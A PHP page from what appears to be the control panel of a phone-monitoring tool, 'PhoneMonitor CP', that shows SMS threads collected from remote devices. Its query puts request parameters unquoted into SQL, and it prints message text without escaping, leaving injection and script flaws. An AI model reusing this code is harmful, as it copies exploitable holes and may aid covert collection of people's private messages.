<?php
require_once('./authenticate.php');
?>
<html>
    <head>
        <meta charset="utf-8"> 
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <!-- Latest compiled and minified CSS -->
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css">

        <!-- jQuery library -->
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>

        <!-- Popper JS -->
        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.6/umd/popper.min.js"></script>

        <!-- Latest compiled JavaScript -->
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js"></script>

        <!-- Font awesome JavaScript -->
        <script src="https://use.fontawesome.com/53d43f5815.js"></script>
        <title>SMS Conversation</title>
    </head>
    <body>

        <nav class="navbar navbar-expand-sm navbar-dark bg-dark">
            <div class="navbar-brand">PhoneMonitor CP</div>
            <ul class="navbar-nav">
                <li class="nav-item"><a href="./clientlist.php" class="nav-link">Clients</a></li>
                <li class="nav-item"><a href="./outputlist.php" class="nav-link">Outputs</a></li>
                <li class="nav-item"><a href="./commandlist.php" class="nav-link">Commands</a></li>
            </ul>
            <ul class="navbar-nav ml-auto">
                <li class="nav-item">
                    <div class="dropdown">
                        <button type="button" class="btn btn-outline-secondary dropdown-toggle" data-toggle="dropdown"><?=$_SESSION['username']?> </button>
                        <div class="dropdown-menu dropdown-menu-right">
                            <a class="dropdown-item" href="./logout.php">Log out</a>
                        </div>
                    </div>
                </li>
            </ul>
        </nav>

        <style>
            .home{
                background-color: rgb(171, 179, 179);
                border-radius: 10px;
            }
            .away{
                background-color: rgb(179, 192, 173);
                border-radius: 10px;
            }
            .date{
                font-weight: 300;
                font-style: oblique;
                font-size: 75%;
                color:rgb(85, 81, 81);
                padding-top: 2px;
            }
        </style>
        
        <div class="container">
        <?php
        include('./helperfuncs.php');
        
        $conn=@new mysqli($DB_HOST,$DB_USERNAME,$DB_PASSWORD,$DB_NAME);
        if($conn->connect_errno==0)
        {
            $deviceUID=$conn->escape_string($_GET['deviceuid']);
            $threadId=$conn->escape_string($_GET['threadid']);
            $getoutputlistquery="SELECT * FROM SMSES_$deviceUID WHERE ThreadId=$threadId ORDER BY Date DESC";
            $response=$conn->query($getoutputlistquery);
            if($response)
            {
                while($row=$response->fetch_assoc())
                {
                    $message=$row['Message'] ;
                    $date=date('h:i:s a | D, M j, Y',strtotime($row['Date']));
                    $type=$row['Type'];
                    switch($type)
                    {
                        case 'Inbox':
                            echo('<div class="row justify-content-end m-2">
                                    <div class="col-md-auto away">'
                                    .nl2br(wordwrap($message, 60, "\n"))
                                    .'<div class="date">'
                                    .$date.'</div></div></div>'
                            );
                        break;
                        default:
                            echo('<div class="row justify-content-start m-2">
                            <div class="col-md-auto home">'
                            .nl2br(wordwrap($message,60,"\n"))
                            .'<div class="date">'
                            .$date.'</div></div></div>'
                            );
                        break;
                    }
                }
            }
        }
        ?>
        </div>
    </body>
</html>